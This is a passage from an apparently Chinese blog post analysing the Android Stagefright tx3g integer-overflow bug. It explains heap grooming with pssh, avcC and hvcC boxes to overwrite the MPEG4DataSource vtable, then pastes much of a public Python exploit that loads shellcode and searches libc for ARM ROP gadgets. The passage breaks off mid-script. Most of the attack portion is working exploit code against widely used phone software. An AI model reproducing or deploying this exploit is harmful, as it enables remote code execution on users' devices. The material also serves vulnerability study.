class="built_in">memcpy</span>(buffer, data, size);                     <span class="comment">// &lt; -- ohhhhhhhhhhh</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">size_t</span>)(mDataSource-&gt;readAt(*offset, buffer + size, chunk_size))</span><br><span class="line">            &lt; chunk_size) &#123;</span><br><span class="line">        <span class="keyword">delete</span>[] buffer;</span><br><span class="line">        buffer = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">    &#125;</span><br><span class="line">    mLastTrack-&gt;meta-&gt;setData(</span><br><span class="line">            kKeyTextFormatData, <span class="number">0</span>, buffer, size + chunk_size);</span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    *offset += chunk_size;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>下面先来看几个<strong>好用</strong>的对象。</p><h3 id="tx3g-box"><a href="#tx3g-box" class="headerlink" title="tx3g box"></a>tx3g box</h3><p>先看一个结构体<code>MPEG4DataSource</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MPEG4DataSource</span> :</span> <span class="keyword">public</span> DataSource &#123;</span><br><span class="line">    MPEG4DataSource(<span class="keyword">const</span> sp&lt;DataSource&gt; &amp;source);</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> status_t <span class="title">initCheck</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> ssize_t <span class="title">readAt</span><span class="params">(<span class="keyword">off64_t</span> offset, <span class="keyword">void</span> *data, <span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> status_t <span class="title">getSize</span><span class="params">(<span class="keyword">off64_t</span> *size)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> uint32_t <span class="title">flags</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">status_t</span> setCachedRange(<span class="keyword">off64_t</span> offset, <span class="keyword">size_t</span> size);</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">virtual</span> ~MPEG4DataSource();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Mutex mLock;</span><br><span class="line">    sp&lt;DataSource&gt; mSource;</span><br><span class="line">    <span class="keyword">off64_t</span> mCachedOffset;</span><br><span class="line">    <span class="keyword">size_t</span> mCachedSize;</span><br><span class="line">    <span class="keyword">uint8_t</span> *mCache;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">clearCache</span><span class="params">()</span></span>;</span><br><span class="line">    MPEG4DataSource(<span class="keyword">const</span> MPEG4DataSource &amp;);</span><br><span class="line">    MPEG4DataSource &amp;<span class="keyword">operator</span>=(<span class="keyword">const</span> MPEG4DataSource &amp;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到它继承自<code>DataSource</code>，有很多虚函数，下面再看下它是怎么被解析tx3g box利用的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!mLastTrack-&gt;meta-&gt;findData(</span><br><span class="line">        kKeyTextFormatData, &amp;type, &amp;data, &amp;size)) &#123;</span><br><span class="line">    size = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">uint8_t</span> *buffer = <span class="keyword">new</span> <span class="keyword">uint8_t</span>[size + chunk_size];</span><br><span class="line"><span class="keyword">if</span> (size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, data, size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">size_t</span>)(mDataSource-&gt;readAt(*offset, buffer + size, chunk_size))</span><br><span class="line">        &lt; chunk_size) &#123;</span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    buffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个<code>mDataSource</code>就是<code>MPEG4DataSource</code>，大小是0x20。如果我们先构造一个tx3g，其中包含的数据大于0x20, 然后在构造一个tx3g构造大小使得<code>size + chunk_size = 0x20</code>, 然后通过memcpy就可以覆盖<code>MPEG4DataSource</code>虚表了。</p><h3 id="PsshInfo"><a href="#PsshInfo" class="headerlink" title="PsshInfo"></a>PsshInfo</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PsshInfo</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> uuid[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> datalen;</span><br><span class="line">    <span class="keyword">uint8_t</span> *data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">case FOURCC('p', 's', 's', 'h'):</span><br><span class="line">&#123;</span><br><span class="line">    PsshInfo pssh;</span><br><span class="line">    <span class="keyword">if</span> (mDataSource-&gt;readAt(data_offset + <span class="number">4</span>, &amp;pssh.uuid, <span class="number">16</span>) &lt; <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint32_t</span> psshdatalen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (mDataSource-&gt;readAt(data_offset + <span class="number">20</span>, &amp;psshdatalen, <span class="number">4</span>) &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">    &#125;</span><br><span class="line">    pssh.datalen = ntohl(psshdatalen);</span><br><span class="line">    ALOGV(<span class="string">"pssh data size: %d"</span>, pssh.datalen);</span><br><span class="line">    <span class="keyword">if</span> (pssh.datalen + <span class="number">20</span> &gt; chunk_size) &#123;</span><br><span class="line">        <span class="comment">// pssh data length exceeds size of containing box</span></span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line">    pssh.data = <span class="keyword">new</span> <span class="keyword">uint8_t</span>[pssh.datalen];</span><br><span class="line">    ALOGV(<span class="string">"allocated pssh @ %p"</span>, pssh.data);</span><br><span class="line">    <span class="keyword">ssize_t</span> requested = (<span class="keyword">ssize_t</span>) pssh.datalen;</span><br><span class="line">    <span class="keyword">if</span> (mDataSource-&gt;readAt(data_offset + <span class="number">24</span>, pssh.data, requested) &lt; requested) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">    &#125;</span><br><span class="line">    mPssh.push_back(pssh);</span><br><span class="line">    *offset += chunk_size;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里注意到的是，在解析完MPEG4格式前，通过pssh分配的内存会一直在内存中。</p><h3 id="avcC-box-和-hvcC-box"><a href="#avcC-box-和-hvcC-box" class="headerlink" title="avcC box 和 hvcC box"></a>avcC box 和 hvcC box</h3><p>这两个基本差不多：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">case FOURCC('a', 'v', 'c', 'C'):</span><br><span class="line">&#123;</span><br><span class="line">    sp&lt;ABuffer&gt; buffer = <span class="keyword">new</span> ABuffer(chunk_data_size);</span><br><span class="line">    <span class="keyword">if</span> (mDataSource-&gt;readAt(</span><br><span class="line">                data_offset, buffer-&gt;data(), chunk_data_size) &lt; chunk_data_size) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 会释放掉原来的 buffer</span></span><br><span class="line">    mLastTrack-&gt;meta-&gt;setData(</span><br><span class="line">            kKeyAVCC, kTypeAVCC, buffer-&gt;data(), chunk_data_size);</span><br><span class="line">    *offset += chunk_size;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这两个box我们可以分配指定大小的内存，并且可以随时释放前面分配的那个内存块。我们需要使用这个来布局tx3g内存块和MPEG4DataSource内存块。</p><h3 id="修改对象虚表指针"><a href="#修改对象虚表指针" class="headerlink" title="修改对象虚表指针"></a>修改对象虚表指针</h3><ol><li>先清理内存后布局，分配一些0x20的<code>pssh</code>。</li><li>再分配<code>avcC</code>和<code>hvcC</code>，用<code>pssh</code>包裹起来。</li><li>改变<code>hvcC</code>的大小为原来的两倍，使0x20的<code>hvcC</code>被释放，产生一个hole1。</li><li>把<code>MPEG4DataSource</code>分配到hole1上。</li><li>把<code>avcC</code>用同样手段释放，产生hole2。</li><li>利用溢出造一个实际大小大于0x20但是溢出成0x20的<code>tx3g</code>到hole2上，这样就能溢出到<code>MPEG4DataSource</code>。</li></ol><h3 id="堆喷射执行shellcode"><a href="#堆喷射执行shellcode" class="headerlink" title="堆喷射执行shellcode"></a>堆喷射执行shellcode</h3><p>用<code>pssh</code>进行堆喷射，这样就可以在可预测的内存地址中定位到特定数据，数据就是在这里就是用于stack_pivot的gadget。</p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><p>来自<a href="https://www.exploit-db.com/exploits/38226" target="_blank" rel="noopener">这里</a>，注释写的很详细了。</p><p>我把代码粘过来是因为这很重要，因为里面还有一些清理内存的操作。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cherrypy</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pwnlib.asm <span class="keyword">as</span> asm</span><br><span class="line"><span class="keyword">import</span> pwnlib.elf <span class="keyword">as</span> elf</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'shellcode.bin'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> tmp:</span><br><span class="line">  shellcode = tmp.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> len(shellcode) % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">  shellcode += <span class="string">'\x00'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># heap grooming configuration</span></span><br><span class="line">alloc_size = <span class="number">0x20</span></span><br><span class="line">groom_count = <span class="number">0x4</span></span><br><span class="line">spray_size = <span class="number">0x100000</span></span><br><span class="line">spray_count = <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># address of the buffer we allocate for our shellcode</span></span><br><span class="line">mmap_address = <span class="number">0x90000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># addresses that we need to predict</span></span><br><span class="line">libc_base = <span class="number">0xb6ebd000</span></span><br><span class="line">spray_address = <span class="number">0xb3000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP gadget addresses</span></span><br><span class="line">stack_pivot = <span class="literal">None</span></span><br><span class="line">pop_pc = <span class="literal">None</span></span><br><span class="line">pop_r0_r1_r2_r3_pc = <span class="literal">None</span></span><br><span class="line">pop_r4_r5_r6_r7_pc = <span class="literal">None</span></span><br><span class="line">ldr_lr_bx_lr = <span class="literal">None</span></span><br><span class="line">ldr_lr_bx_lr_stack_pad = <span class="number">0</span></span><br><span class="line">mmap64 = <span class="literal">None</span></span><br><span class="line">memcpy = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_arm_gadget</span><span class="params">(e, gadget)</span>:</span></span><br><span class="line">  gadget_bytes = asm.asm(gadget, arch=<span class="string">'arm'</span>)</span><br><span class="line">  gadget_address = <span class="literal">None</span></span><br><span class="line">  <span class="keyword">for</span> address <span class="keyword">in</span> e.search(gadget_bytes):</span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> 为什么要找这种地址</span></span><br><span class="line">    <span class="keyword">if</span> address % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">      gadget_address = address</span><br><span class="line">      <span class="keyword">if</span> gadget_bytes == e.read(gadget_address, len(gadget_bytes)):</span><br><span class="line">        <span class="keyword">print</span> asm.disasm(gadget_bytes, vma=gadget_address, arch=<span class="string">'arm'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">return</span> gadget_address</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_thumb_gadget</span><span class="params">(e, gadget)</span>:</span></span><br><span class="line">  gadget_bytes = asm.asm(gadget, arch=<span class="string">'thumb'</span>)</span><br><span class="line">  gadget_address = <span class="literal">None</span></span><br><span class="line">  <span class="keyword">for</span> address <span class="keyword">in</span> e.search(gadget_bytes):</span><br><span class="line">    <span class="keyword">if</span> address % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">      gadget_address = address + <span class="number">1</span></span><br><span class="line">      <span class="keyword">if</span> gadget_bytes == e.read(gadget_address - <span class="number">1</span>, len(gadget_bytes)):</span><br><span class="line">        <span class="keyword">print</span> asm.disasm(gadget_bytes, vma=gadget_address<span class="number">-1</span>, arch=<span class="string">'thumb'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">return</span> gadget_address</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_gadget</span><span class="params">(e, gadget)</span>:</span></span><br><span class="line">  gadget_address = find_thumb_gadget(e, gadget)</span><br><span class="line">  <span class="keyword">if</span> gadget_address <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> gadget_address</span><br><span class="line">  <span class="keyword">return</span> find_arm_gadget(e, gadget)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_rop_gadgets</span><span class="params">(path)</span>:</span></span><br><span class="line">  <span class="keyword">global</span> memcpy</span><br><span class="line">  <span class="keyword">global</span> mmap64</span><br><span class="line">  <span class="keyword">global</span> stack_pivot</span><br><span class="line">  <span class="keyword">global</span> pop_pc</span><br><span class="line">  <span class="keyword">global</span> pop_r0_r1_r2_r3_pc</span><br><span class="line">  <span class="keyword">global</span> pop_r4_r5_r6_r7_pc</span><br><span class="line">  <span class="keyword">global</span> ldr_lr_bx_lr</span><br><span class="line">  <span class="keyword">global</span> ldr_lr_bx_lr_stack_pad</span><br><span class="line"></span><br><span class="line">  e = elf.ELF(path)</span><br><span class="line">  e.address = libc_base</span><br><span class="line"></span><br><span class="line">  memcpy = e.symbols[<span class="string">'memcpy'</span>]</span><br><span class="line">  <span class="keyword">print</span> <span class="string">'[*] memcpy : 0x&#123;:08x&#125;'</span>.format(memcpy)</span><br><span class="line">  mmap64 = e.symbols[<span class="string">'mmap64'</span>]</span><br><span class="line">  <span class="keyword">print</span> <span class="string">'[*] mmap64 : 0x&#123;:08x&#125;'</span>.format(mmap64)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># .text:00013344    ADD             R2, R0, #0x4C</span></span><br><span class="line">  <span class="comment"># .text:00013348    LDMIA           R2, &#123;R4-LR&#125;</span></span><br><span class="line">  <span class="comment"># .text:0001334C    TEQ             SP, #0</span></span><br><span class="line">  <span class="comment"># .text:00013350    TEQNE           LR, #0</span></span><br><span class="line">  <span class="comment"># .text:00013354    BEQ             botch_0</span></span><br><span class="line">  <span class="comment"># .text:00013358    MOV             R0, R1</span></span><br><span class="line">  <span class="comment"># .text:0001335C    TEQ             R0, #0</span></span><br><span class="line">  <span class="comment"># .text:00013360    MOVEQ           R0, #1</span></span><br><span class="line">  <span class="comment"># .text:00013364    BX              LR</span></span><br><span class="line"></span><br><span class="line">  pivot_asm = <span class="string">''</span></span><br><span class="line">  pivot_asm += <span class="string">'add   r2, r0, #0x4c\n'</span></span><br><span class="line">  pivot_asm += <span class="string">'ldmia r2, &#123;r4 - lr&#125;\n'</span></span><br><span class="line">  pivot_asm += <span class="string">'teq   sp, #0\n'</span></span><br><span class="line">  pivot_asm += <span class="string">'teqne lr, #0'</span></span><br><span class="line">  stack_pivot = find_arm_gadget(e, pivot_asm)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">'[*] stack_pivot : 0x&#123;:08x&#125;'</span>.format(stack_pivot)</span><br><span class="line"></span><br><span class="line">  pop_pc_asm = <span class="string">'pop &#123;pc&#125;'</span></span><br><span class="line">  pop_pc = find_gadget(e, pop_pc_asm)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">'[*] pop_pc : 0x&#123;:08x&#125;'</span>.format(pop_pc)</span><br><span class="line"></span><br><span class="line">  pop_r0_r1_r2_r3_pc = find_gadget(e, <span class="string">'pop &#123;r0, r1, r2, r3, pc&#125;'</span>)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">'[*] pop_r0_r1_r2_r3_pc : 0x&#123;:08x&#125;'</span>.format(pop_r0_r1_r2_r3_pc)</span><br><span class="line"></span><br><span class="line">  pop_r4_r5_r6_r7_pc = find_gadget(e, <span class="string">'pop &#123;r4, r5, r6, r7, pc&#125;'</span>)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">'[*] pop_r4_r5_r6_r7_pc : 0x&#123;:08x&#125;'</span>.format(pop_r4_r5_r6_r7_pc)</span><br><span class="line"></span><br><span class="line">  ldr_lr_bx_lr_stack_pad = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">0x100</span>, <span class="number">4</span>):</span><br><span class="line">    ldr_lr_bx_lr_asm =  <span class="string">'ldr lr, [sp, #0x&#123;:08x&#125;]\n'</span>.format(i)</span><br><span class="line">    ldr_lr_bx_lr_asm += <span class="string">'add sp, sp, #0x&#123;:08x&#125;\n'</span>.format(i + <span class="number">8</span>)</span><br><span class="line">    ldr_lr_bx_lr_asm += <span class="string">'bx  lr'</span></span><br><span class="line">    ldr_lr_bx_lr = find_gadget(e, ldr_lr_bx_lr_asm)</span><br><span class="line">    <span class="keyword">if</span> ldr_lr_bx_lr <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">      ldr_lr_bx_lr_stack_pad = i</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(size)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">'#'</span> * size</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pb32</span><span class="params">(val)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> struct.pack(<span class="string">"&gt;I"</span>, val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pb64</span><span class="params">(val)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> struct.pack(<span class="string">"&gt;Q"</span>, val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span><span class="params">(val)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> struct.pack(<span 